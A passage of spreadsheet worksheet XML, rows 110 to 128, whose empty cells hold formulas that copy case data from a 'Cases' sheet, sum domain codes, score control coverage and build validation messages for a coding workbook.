      <c r="C110" s="11">
        <f>Cases!C110</f>
        <v/>
      </c>
      <c r="D110" s="11">
        <f>IF(Cases!F110="",LEFT(Cases!G110,120),Cases!F110)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E110:L110)=0,"",SUM(E110:L110))</f>
        <v/>
      </c>
      <c r="AJ110" s="13">
        <f>IF(AI110="","",N(E110)*3+N(F110)*2+N(G110)*2+N(H110)*2+N(I110)*2+N(J110)*3+N(K110)*3+N(L110)*3)</f>
        <v/>
      </c>
      <c r="AK110" s="13">
        <f>IF(AI110="","",COUNTIF(N110:AG110,1))</f>
        <v/>
      </c>
      <c r="AL110" s="13">
        <f>IF(OR(AJ110="",AJ110=0),"",ROUND(100*(AJ110-AK110)/AJ110,1))</f>
        <v/>
      </c>
      <c r="AM110" s="11">
        <f>IF(AI110="","",IF(AI110=0,"No domain coded 1; ","")&amp;IF(M110="","Primary domain missing; ",IF(IFERROR(INDEX(E110:L110,1,M110),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N110:AG110)&lt;&gt;AJ110,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH110="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN110" s="13">
        <f>IF(AND(AI110&lt;&gt;"",AM110=""),1,0)</f>
        <v/>
      </c>
      <c r="AO110" s="14" t="n"/>
    </row>
    <row r="111">
      <c r="A111" s="11">
        <f>Cases!A111</f>
        <v/>
      </c>
      <c r="B111" s="11">
        <f>Cases!B111</f>
        <v/>
      </c>
      <c r="C111" s="11">
        <f>Cases!C111</f>
        <v/>
      </c>
      <c r="D111" s="11">
        <f>IF(Cases!F111="",LEFT(Cases!G111,120),Cases!F111)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E111:L111)=0,"",SUM(E111:L111))</f>
        <v/>
      </c>
      <c r="AJ111" s="13">
        <f>IF(AI111="","",N(E111)*3+N(F111)*2+N(G111)*2+N(H111)*2+N(I111)*2+N(J111)*3+N(K111)*3+N(L111)*3)</f>
        <v/>
      </c>
      <c r="AK111" s="13">
        <f>IF(AI111="","",COUNTIF(N111:AG111,1))</f>
        <v/>
      </c>
      <c r="AL111" s="13">
        <f>IF(OR(AJ111="",AJ111=0),"",ROUND(100*(AJ111-AK111)/AJ111,1))</f>
        <v/>
      </c>
      <c r="AM111" s="11">
        <f>IF(AI111="","",IF(AI111=0,"No domain coded 1; ","")&amp;IF(M111="","Primary domain missing; ",IF(IFERROR(INDEX(E111:L111,1,M111),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N111:AG111)&lt;&gt;AJ111,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH111="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN111" s="13">
        <f>IF(AND(AI111&lt;&gt;"",AM111=""),1,0)</f>
        <v/>
      </c>
      <c r="AO111" s="14" t="n"/>
    </row>
    <row r="112">
      <c r="A112" s="11">
        <f>Cases!A112</f>
        <v/>
      </c>
      <c r="B112" s="11">
        <f>Cases!B112</f>
        <v/>
      </c>
      <c r="C112" s="11">
        <f>Cases!C112</f>
        <v/>
      </c>
      <c r="D112" s="11">
        <f>IF(Cases!F112="",LEFT(Cases!G112,120),Cases!F112)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E112:L112)=0,"",SUM(E112:L112))</f>
        <v/>
      </c>
      <c r="AJ112" s="13">
        <f>IF(AI112="","",N(E112)*3+N(F112)*2+N(G112)*2+N(H112)*2+N(I112)*2+N(J112)*3+N(K112)*3+N(L112)*3)</f>
        <v/>
      </c>
      <c r="AK112" s="13">
        <f>IF(AI112="","",COUNTIF(N112:AG112,1))</f>
        <v/>
      </c>
      <c r="AL112" s="13">
        <f>IF(OR(AJ112="",AJ112=0),"",ROUND(100*(AJ112-AK112)/AJ112,1))</f>
        <v/>
      </c>
      <c r="AM112" s="11">
        <f>IF(AI112="","",IF(AI112=0,"No domain coded 1; ","")&amp;IF(M112="","Primary domain missing; ",IF(IFERROR(INDEX(E112:L112,1,M112),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N112:AG112)&lt;&gt;AJ112,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH112="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN112" s="13">
        <f>IF(AND(AI112&lt;&gt;"",AM112=""),1,0)</f>
        <v/>
      </c>
      <c r="AO112" s="14" t="n"/>
    </row>
    <row r="113">
      <c r="A113" s="11">
        <f>Cases!A113</f>
        <v/>
      </c>
      <c r="B113" s="11">
        <f>Cases!B113</f>
        <v/>
      </c>
      <c r="C113" s="11">
        <f>Cases!C113</f>
        <v/>
      </c>
      <c r="D113" s="11">
        <f>IF(Cases!F113="",LEFT(Cases!G113,120),Cases!F113)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E113:L113)=0,"",SUM(E113:L113))</f>
        <v/>
      </c>
      <c r="AJ113" s="13">
        <f>IF(AI113="","",N(E113)*3+N(F113)*2+N(G113)*2+N(H113)*2+N(I113)*2+N(J113)*3+N(K113)*3+N(L113)*3)</f>
        <v/>
      </c>
      <c r="AK113" s="13">
        <f>IF(AI113="","",COUNTIF(N113:AG113,1))</f>
        <v/>
      </c>
      <c r="AL113" s="13">
        <f>IF(OR(AJ113="",AJ113=0),"",ROUND(100*(AJ113-AK113)/AJ113,1))</f>
        <v/>
      </c>
      <c r="AM113" s="11">
        <f>IF(AI113="","",IF(AI113=0,"No domain coded 1; ","")&amp;IF(M113="","Primary domain missing; ",IF(IFERROR(INDEX(E113:L113,1,M113),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N113:AG113)&lt;&gt;AJ113,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH113="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN113" s="13">
        <f>IF(AND(AI113&lt;&gt;"",AM113=""),1,0)</f>
        <v/>
      </c>
      <c r="AO113" s="14" t="n"/>
    </row>
    <row r="114">
      <c r="A114" s="11">
        <f>Cases!A114</f>
        <v/>
      </c>
      <c r="B114" s="11">
        <f>Cases!B114</f>
        <v/>
      </c>
      <c r="C114" s="11">
        <f>Cases!C114</f>
        <v/>
      </c>
      <c r="D114" s="11">
        <f>IF(Cases!F114="",LEFT(Cases!G114,120),Cases!F114)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E114:L114)=0,"",SUM(E114:L114))</f>
        <v/>
      </c>
      <c r="AJ114" s="13">
        <f>IF(AI114="","",N(E114)*3+N(F114)*2+N(G114)*2+N(H114)*2+N(I114)*2+N(J114)*3+N(K114)*3+N(L114)*3)</f>
        <v/>
      </c>
      <c r="AK114" s="13">
        <f>IF(AI114="","",COUNTIF(N114:AG114,1))</f>
        <v/>
      </c>
      <c r="AL114" s="13">
        <f>IF(OR(AJ114="",AJ114=0),"",ROUND(100*(AJ114-AK114)/AJ114,1))</f>
        <v/>
      </c>
      <c r="AM114" s="11">
        <f>IF(AI114="","",IF(AI114=0,"No domain coded 1; ","")&amp;IF(M114="","Primary domain missing; ",IF(IFERROR(INDEX(E114:L114,1,M114),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N114:AG114)&lt;&gt;AJ114,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH114="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN114" s="13">
        <f>IF(AND(AI114&lt;&gt;"",AM114=""),1,0)</f>
        <v/>
      </c>
      <c r="AO114" s="14" t="n"/>
    </row>
    <row r="115">
      <c r="A115" s="11">
        <f>Cases!A115</f>
        <v/>
      </c>
      <c r="B115" s="11">
        <f>Cases!B115</f>
        <v/>
      </c>
      <c r="C115" s="11">
        <f>Cases!C115</f>
        <v/>
      </c>
      <c r="D115" s="11">
        <f>IF(Cases!F115="",LEFT(Cases!G115,120),Cases!F115)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E115:L115)=0,"",SUM(E115:L115))</f>
        <v/>
      </c>
      <c r="AJ115" s="13">
        <f>IF(AI115="","",N(E115)*3+N(F115)*2+N(G115)*2+N(H115)*2+N(I115)*2+N(J115)*3+N(K115)*3+N(L115)*3)</f>
        <v/>
      </c>
      <c r="AK115" s="13">
        <f>IF(AI115="","",COUNTIF(N115:AG115,1))</f>
        <v/>
      </c>
      <c r="AL115" s="13">
        <f>IF(OR(AJ115="",AJ115=0),"",ROUND(100*(AJ115-AK115)/AJ115,1))</f>
        <v/>
      </c>
      <c r="AM115" s="11">
        <f>IF(AI115="","",IF(AI115=0,"No domain coded 1; ","")&amp;IF(M115="","Primary domain missing; ",IF(IFERROR(INDEX(E115:L115,1,M115),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N115:AG115)&lt;&gt;AJ115,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH115="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN115" s="13">
        <f>IF(AND(AI115&lt;&gt;"",AM115=""),1,0)</f>
        <v/>
      </c>
      <c r="AO115" s="14" t="n"/>
    </row>
    <row r="116">
      <c r="A116" s="11">
        <f>Cases!A116</f>
        <v/>
      </c>
      <c r="B116" s="11">
        <f>Cases!B116</f>
        <v/>
      </c>
      <c r="C116" s="11">
        <f>Cases!C116</f>
        <v/>
      </c>
      <c r="D116" s="11">
        <f>IF(Cases!F116="",LEFT(Cases!G116,120),Cases!F116)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E116:L116)=0,"",SUM(E116:L116))</f>
        <v/>
      </c>
      <c r="AJ116" s="13">
        <f>IF(AI116="","",N(E116)*3+N(F116)*2+N(G116)*2+N(H116)*2+N(I116)*2+N(J116)*3+N(K116)*3+N(L116)*3)</f>
        <v/>
      </c>
      <c r="AK116" s="13">
        <f>IF(AI116="","",COUNTIF(N116:AG116,1))</f>
        <v/>
      </c>
      <c r="AL116" s="13">
        <f>IF(OR(AJ116="",AJ116=0),"",ROUND(100*(AJ116-AK116)/AJ116,1))</f>
        <v/>
      </c>
      <c r="AM116" s="11">
        <f>IF(AI116="","",IF(AI116=0,"No domain coded 1; ","")&amp;IF(M116="","Primary domain missing; ",IF(IFERROR(INDEX(E116:L116,1,M116),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N116:AG116)&lt;&gt;AJ116,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH116="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN116" s="13">
        <f>IF(AND(AI116&lt;&gt;"",AM116=""),1,0)</f>
        <v/>
      </c>
      <c r="AO116" s="14" t="n"/>
    </row>
    <row r="117">
      <c r="A117" s="11">
        <f>Cases!A117</f>
        <v/>
      </c>
      <c r="B117" s="11">
        <f>Cases!B117</f>
        <v/>
      </c>
      <c r="C117" s="11">
        <f>Cases!C117</f>
        <v/>
      </c>
      <c r="D117" s="11">
        <f>IF(Cases!F117="",LEFT(Cases!G117,120),Cases!F117)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E117:L117)=0,"",SUM(E117:L117))</f>
        <v/>
      </c>
      <c r="AJ117" s="13">
        <f>IF(AI117="","",N(E117)*3+N(F117)*2+N(G117)*2+N(H117)*2+N(I117)*2+N(J117)*3+N(K117)*3+N(L117)*3)</f>
        <v/>
      </c>
      <c r="AK117" s="13">
        <f>IF(AI117="","",COUNTIF(N117:AG117,1))</f>
        <v/>
      </c>
      <c r="AL117" s="13">
        <f>IF(OR(AJ117="",AJ117=0),"",ROUND(100*(AJ117-AK117)/AJ117,1))</f>
        <v/>
      </c>
      <c r="AM117" s="11">
        <f>IF(AI117="","",IF(AI117=0,"No domain coded 1; ","")&amp;IF(M117="","Primary domain missing; ",IF(IFERROR(INDEX(E117:L117,1,M117),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N117:AG117)&lt;&gt;AJ117,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH117="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN117" s="13">
        <f>IF(AND(AI117&lt;&gt;"",AM117=""),1,0)</f>
        <v/>
      </c>
      <c r="AO117" s="14" t="n"/>
    </row>
    <row r="118">
      <c r="A118" s="11">
        <f>Cases!A118</f>
        <v/>
      </c>
      <c r="B118" s="11">
        <f>Cases!B118</f>
        <v/>
      </c>
      <c r="C118" s="11">
        <f>Cases!C118</f>
        <v/>
      </c>
      <c r="D118" s="11">
        <f>IF(Cases!F118="",LEFT(Cases!G118,120),Cases!F118)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E118:L118)=0,"",SUM(E118:L118))</f>
        <v/>
      </c>
      <c r="AJ118" s="13">
        <f>IF(AI118="","",N(E118)*3+N(F118)*2+N(G118)*2+N(H118)*2+N(I118)*2+N(J118)*3+N(K118)*3+N(L118)*3)</f>
        <v/>
      </c>
      <c r="AK118" s="13">
        <f>IF(AI118="","",COUNTIF(N118:AG118,1))</f>
        <v/>
      </c>
      <c r="AL118" s="13">
        <f>IF(OR(AJ118="",AJ118=0),"",ROUND(100*(AJ118-AK118)/AJ118,1))</f>
        <v/>
      </c>
      <c r="AM118" s="11">
        <f>IF(AI118="","",IF(AI118=0,"No domain coded 1; ","")&amp;IF(M118="","Primary domain missing; ",IF(IFERROR(INDEX(E118:L118,1,M118),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N118:AG118)&lt;&gt;AJ118,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH118="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN118" s="13">
        <f>IF(AND(AI118&lt;&gt;"",AM118=""),1,0)</f>
        <v/>
      </c>
      <c r="AO118" s="14" t="n"/>
    </row>
    <row r="119">
      <c r="A119" s="11">
        <f>Cases!A119</f>
        <v/>
      </c>
      <c r="B119" s="11">
        <f>Cases!B119</f>
        <v/>
      </c>
      <c r="C119" s="11">
        <f>Cases!C119</f>
        <v/>
      </c>
      <c r="D119" s="11">
        <f>IF(Cases!F119="",LEFT(Cases!G119,120),Cases!F119)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E119:L119)=0,"",SUM(E119:L119))</f>
        <v/>
      </c>
      <c r="AJ119" s="13">
        <f>IF(AI119="","",N(E119)*3+N(F119)*2+N(G119)*2+N(H119)*2+N(I119)*2+N(J119)*3+N(K119)*3+N(L119)*3)</f>
        <v/>
      </c>
      <c r="AK119" s="13">
        <f>IF(AI119="","",COUNTIF(N119:AG119,1))</f>
        <v/>
      </c>
      <c r="AL119" s="13">
        <f>IF(OR(AJ119="",AJ119=0),"",ROUND(100*(AJ119-AK119)/AJ119,1))</f>
        <v/>
      </c>
      <c r="AM119" s="11">
        <f>IF(AI119="","",IF(AI119=0,"No domain coded 1; ","")&amp;IF(M119="","Primary domain missing; ",IF(IFERROR(INDEX(E119:L119,1,M119),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N119:AG119)&lt;&gt;AJ119,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH119="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN119" s="13">
        <f>IF(AND(AI119&lt;&gt;"",AM119=""),1,0)</f>
        <v/>
      </c>
      <c r="AO119" s="14" t="n"/>
    </row>
    <row r="120">
      <c r="A120" s="11">
        <f>Cases!A120</f>
        <v/>
      </c>
      <c r="B120" s="11">
        <f>Cases!B120</f>
        <v/>
      </c>
      <c r="C120" s="11">
        <f>Cases!C120</f>
        <v/>
      </c>
      <c r="D120" s="11">
        <f>IF(Cases!F120="",LEFT(Cases!G120,120),Cases!F120)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E120:L120)=0,"",SUM(E120:L120))</f>
        <v/>
      </c>
      <c r="AJ120" s="13">
        <f>IF(AI120="","",N(E120)*3+N(F120)*2+N(G120)*2+N(H120)*2+N(I120)*2+N(J120)*3+N(K120)*3+N(L120)*3)</f>
        <v/>
      </c>
      <c r="AK120" s="13">
        <f>IF(AI120="","",COUNTIF(N120:AG120,1))</f>
        <v/>
      </c>
      <c r="AL120" s="13">
        <f>IF(OR(AJ120="",AJ120=0),"",ROUND(100*(AJ120-AK120)/AJ120,1))</f>
        <v/>
      </c>
      <c r="AM120" s="11">
        <f>IF(AI120="","",IF(AI120=0,"No domain coded 1; ","")&amp;IF(M120="","Primary domain missing; ",IF(IFERROR(INDEX(E120:L120,1,M120),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N120:AG120)&lt;&gt;AJ120,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH120="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN120" s="13">
        <f>IF(AND(AI120&lt;&gt;"",AM120=""),1,0)</f>
        <v/>
      </c>
      <c r="AO120" s="14" t="n"/>
    </row>
    <row r="121">
      <c r="A121" s="11">
        <f>Cases!A121</f>
        <v/>
      </c>
      <c r="B121" s="11">
        <f>Cases!B121</f>
        <v/>
      </c>
      <c r="C121" s="11">
        <f>Cases!C121</f>
        <v/>
      </c>
      <c r="D121" s="11">
        <f>IF(Cases!F121="",LEFT(Cases!G121,120),Cases!F121)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E121:L121)=0,"",SUM(E121:L121))</f>
        <v/>
      </c>
      <c r="AJ121" s="13">
        <f>IF(AI121="","",N(E121)*3+N(F121)*2+N(G121)*2+N(H121)*2+N(I121)*2+N(J121)*3+N(K121)*3+N(L121)*3)</f>
        <v/>
      </c>
      <c r="AK121" s="13">
        <f>IF(AI121="","",COUNTIF(N121:AG121,1))</f>
        <v/>
      </c>
      <c r="AL121" s="13">
        <f>IF(OR(AJ121="",AJ121=0),"",ROUND(100*(AJ121-AK121)/AJ121,1))</f>
        <v/>
      </c>
      <c r="AM121" s="11">
        <f>IF(AI121="","",IF(AI121=0,"No domain coded 1; ","")&amp;IF(M121="","Primary domain missing; ",IF(IFERROR(INDEX(E121:L121,1,M121),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N121:AG121)&lt;&gt;AJ121,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH121="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN121" s="13">
        <f>IF(AND(AI121&lt;&gt;"",AM121=""),1,0)</f>
        <v/>
      </c>
      <c r="AO121" s="14" t="n"/>
    </row>
    <row r="122">
      <c r="A122" s="11">
        <f>Cases!A122</f>
        <v/>
      </c>
      <c r="B122" s="11">
        <f>Cases!B122</f>
        <v/>
      </c>
      <c r="C122" s="11">
        <f>Cases!C122</f>
        <v/>
      </c>
      <c r="D122" s="11">
        <f>IF(Cases!F122="",LEFT(Cases!G122,120),Cases!F122)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E122:L122)=0,"",SUM(E122:L122))</f>
        <v/>
      </c>
      <c r="AJ122" s="13">
        <f>IF(AI122="","",N(E122)*3+N(F122)*2+N(G122)*2+N(H122)*2+N(I122)*2+N(J122)*3+N(K122)*3+N(L122)*3)</f>
        <v/>
      </c>
      <c r="AK122" s="13">
        <f>IF(AI122="","",COUNTIF(N122:AG122,1))</f>
        <v/>
      </c>
      <c r="AL122" s="13">
        <f>IF(OR(AJ122="",AJ122=0),"",ROUND(100*(AJ122-AK122)/AJ122,1))</f>
        <v/>
      </c>
      <c r="AM122" s="11">
        <f>IF(AI122="","",IF(AI122=0,"No domain coded 1; ","")&amp;IF(M122="","Primary domain missing; ",IF(IFERROR(INDEX(E122:L122,1,M122),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N122:AG122)&lt;&gt;AJ122,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH122="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN122" s="13">
        <f>IF(AND(AI122&lt;&gt;"",AM122=""),1,0)</f>
        <v/>
      </c>
      <c r="AO122" s="14" t="n"/>
    </row>
    <row r="123">
      <c r="A123" s="11">
        <f>Cases!A123</f>
        <v/>
      </c>
      <c r="B123" s="11">
        <f>Cases!B123</f>
        <v/>
      </c>
      <c r="C123" s="11">
        <f>Cases!C123</f>
        <v/>
      </c>
      <c r="D123" s="11">
        <f>IF(Cases!F123="",LEFT(Cases!G123,120),Cases!F123)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E123:L123)=0,"",SUM(E123:L123))</f>
        <v/>
      </c>
      <c r="AJ123" s="13">
        <f>IF(AI123="","",N(E123)*3+N(F123)*2+N(G123)*2+N(H123)*2+N(I123)*2+N(J123)*3+N(K123)*3+N(L123)*3)</f>
        <v/>
      </c>
      <c r="AK123" s="13">
        <f>IF(AI123="","",COUNTIF(N123:AG123,1))</f>
        <v/>
      </c>
      <c r="AL123" s="13">
        <f>IF(OR(AJ123="",AJ123=0),"",ROUND(100*(AJ123-AK123)/AJ123,1))</f>
        <v/>
      </c>
      <c r="AM123" s="11">
        <f>IF(AI123="","",IF(AI123=0,"No domain coded 1; ","")&amp;IF(M123="","Primary domain missing; ",IF(IFERROR(INDEX(E123:L123,1,M123),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N123:AG123)&lt;&gt;AJ123,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH123="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN123" s="13">
        <f>IF(AND(AI123&lt;&gt;"",AM123=""),1,0)</f>
        <v/>
      </c>
      <c r="AO123" s="14" t="n"/>
    </row>
    <row r="124">
      <c r="A124" s="11">
        <f>Cases!A124</f>
        <v/>
      </c>
      <c r="B124" s="11">
        <f>Cases!B124</f>
        <v/>
      </c>
      <c r="C124" s="11">
        <f>Cases!C124</f>
        <v/>
      </c>
      <c r="D124" s="11">
        <f>IF(Cases!F124="",LEFT(Cases!G124,120),Cases!F124)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E124:L124)=0,"",SUM(E124:L124))</f>
        <v/>
      </c>
      <c r="AJ124" s="13">
        <f>IF(AI124="","",N(E124)*3+N(F124)*2+N(G124)*2+N(H124)*2+N(I124)*2+N(J124)*3+N(K124)*3+N(L124)*3)</f>
        <v/>
      </c>
      <c r="AK124" s="13">
        <f>IF(AI124="","",COUNTIF(N124:AG124,1))</f>
        <v/>
      </c>
      <c r="AL124" s="13">
        <f>IF(OR(AJ124="",AJ124=0),"",ROUND(100*(AJ124-AK124)/AJ124,1))</f>
        <v/>
      </c>
      <c r="AM124" s="11">
        <f>IF(AI124="","",IF(AI124=0,"No domain coded 1; ","")&amp;IF(M124="","Primary domain missing; ",IF(IFERROR(INDEX(E124:L124,1,M124),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N124:AG124)&lt;&gt;AJ124,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH124="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN124" s="13">
        <f>IF(AND(AI124&lt;&gt;"",AM124=""),1,0)</f>
        <v/>
      </c>
      <c r="AO124" s="14" t="n"/>
    </row>
    <row r="125">
      <c r="A125" s="11">
        <f>Cases!A125</f>
        <v/>
      </c>
      <c r="B125" s="11">
        <f>Cases!B125</f>
        <v/>
      </c>
      <c r="C125" s="11">
        <f>Cases!C125</f>
        <v/>
      </c>
      <c r="D125" s="11">
        <f>IF(Cases!F125="",LEFT(Cases!G125,120),Cases!F125)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E125:L125)=0,"",SUM(E125:L125))</f>
        <v/>
      </c>
      <c r="AJ125" s="13">
        <f>IF(AI125="","",N(E125)*3+N(F125)*2+N(G125)*2+N(H125)*2+N(I125)*2+N(J125)*3+N(K125)*3+N(L125)*3)</f>
        <v/>
      </c>
      <c r="AK125" s="13">
        <f>IF(AI125="","",COUNTIF(N125:AG125,1))</f>
        <v/>
      </c>
      <c r="AL125" s="13">
        <f>IF(OR(AJ125="",AJ125=0),"",ROUND(100*(AJ125-AK125)/AJ125,1))</f>
        <v/>
      </c>
      <c r="AM125" s="11">
        <f>IF(AI125="","",IF(AI125=0,"No domain coded 1; ","")&amp;IF(M125="","Primary domain missing; ",IF(IFERROR(INDEX(E125:L125,1,M125),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N125:AG125)&lt;&gt;AJ125,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH125="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN125" s="13">
        <f>IF(AND(AI125&lt;&gt;"",AM125=""),1,0)</f>
        <v/>
      </c>
      <c r="AO125" s="14" t="n"/>
    </row>
    <row r="126">
      <c r="A126" s="11">
        <f>Cases!A126</f>
        <v/>
      </c>
      <c r="B126" s="11">
        <f>Cases!B126</f>
        <v/>
      </c>
      <c r="C126" s="11">
        <f>Cases!C126</f>
        <v/>
      </c>
      <c r="D126" s="11">
        <f>IF(Cases!F126="",LEFT(Cases!G126,120),Cases!F126)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E126:L126)=0,"",SUM(E126:L126))</f>
        <v/>
      </c>
      <c r="AJ126" s="13">
        <f>IF(AI126="","",N(E126)*3+N(F126)*2+N(G126)*2+N(H126)*2+N(I126)*2+N(J126)*3+N(K126)*3+N(L126)*3)</f>
        <v/>
      </c>
      <c r="AK126" s="13">
        <f>IF(AI126="","",COUNTIF(N126:AG126,1))</f>
        <v/>
      </c>
      <c r="AL126" s="13">
        <f>IF(OR(AJ126="",AJ126=0),"",ROUND(100*(AJ126-AK126)/AJ126,1))</f>
        <v/>
      </c>
      <c r="AM126" s="11">
        <f>IF(AI126="","",IF(AI126=0,"No domain coded 1; ","")&amp;IF(M126="","Primary domain missing; ",IF(IFERROR(INDEX(E126:L126,1,M126),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N126:AG126)&lt;&gt;AJ126,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH126="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN126" s="13">
        <f>IF(AND(AI126&lt;&gt;"",AM126=""),1,0)</f>
        <v/>
      </c>
      <c r="AO126" s="14" t="n"/>
    </row>
    <row r="127">
      <c r="A127" s="11">
        <f>Cases!A127</f>
        <v/>
      </c>
      <c r="B127" s="11">
        <f>Cases!B127</f>
        <v/>
      </c>
      <c r="C127" s="11">
        <f>Cases!C127</f>
        <v/>
      </c>
      <c r="D127" s="11">
        <f>IF(Cases!F127="",LEFT(Cases!G127,120),Cases!F127)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E127:L127)=0,"",SUM(E127:L127))</f>
        <v/>
      </c>
      <c r="AJ127" s="13">
        <f>IF(AI127="","",N(E127)*3+N(F127)*2+N(G127)*2+N(H127)*2+N(I127)*2+N(J127)*3+N(K127)*3+N(L127)*3)</f>
        <v/>
      </c>
      <c r="AK127" s="13">
        <f>IF(AI127="","",COUNTIF(N127:AG127,1))</f>
        <v/>
      </c>
      <c r="AL127" s="13">
        <f>IF(OR(AJ127="",AJ127=0),"",ROUND(100*(AJ127-AK127)/AJ127,1))</f>
        <v/>
      </c>
      <c r="AM127" s="11">
        <f>IF(AI127="","",IF(AI127=0,"No domain coded 1; ","")&amp;IF(M127="","Primary domain missing; ",IF(IFERROR(INDEX(E127:L127,1,M127),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N127:AG127)&lt;&gt;AJ127,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH127="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN127" s="13">
        <f>IF(AND(AI127&lt;&gt;"",AM127=""),1,0)</f>
        <v/>
      </c>
      <c r="AO127" s="14" t="n"/>
    </row>
    <row r="128">
      <c r="A128" s="11">
        <f>Cases!A128</f>
        <v/>
      </c>
      <c r="B128" s="11">
        <f>Cases!B128</f>
        <v/>
      </c>
      <c r="C128" s="11">
        <f>Cases!C128</f>
        <v/>
      </c>
      <c r="D128" s="11">
        <f>IF(Cases!F128="",LEFT(Cases!G128,120),Cases!F128)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E128:L128)=0,"",SUM(E128:L128))</f>
        <v/>
      </c>
      <c r="AJ128" s="13">
        <f>IF(AI128="","",N(E128)*3+N(F128)*2+N(G128)*2+N(H128)*2+N(I128)*2+N(J128)*3+N(K128)*3+N(L128)*3)</f>
        <v/>
      </c>
      <c r="AK128" s="13">
        <f>IF(AI128="","",COUNTIF(N128:AG128,1))</f>
        <v/>
      </c>
      <c r="AL128" s="13">
        <f>IF(OR(AJ128="",AJ128=0),"",ROUND(100*(AJ128-AK128)/AJ128,1))</f>
        <v/>
      </c>
      <c r="AM128" s="11">
        <f>IF(AI128="","",IF(AI128=0,"No domain coded 1; ","")&amp;IF(M128="","Primary domain missing; ",IF(IFERROR(INDEX(E128:L128,1,M128),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N128:AG128)&lt;&gt;AJ128,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH128="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN128" s="13">
        <f>IF(AND(AI128&lt;&gt;"",AM128=""),1,0)</f>
        <v/>
      </c>
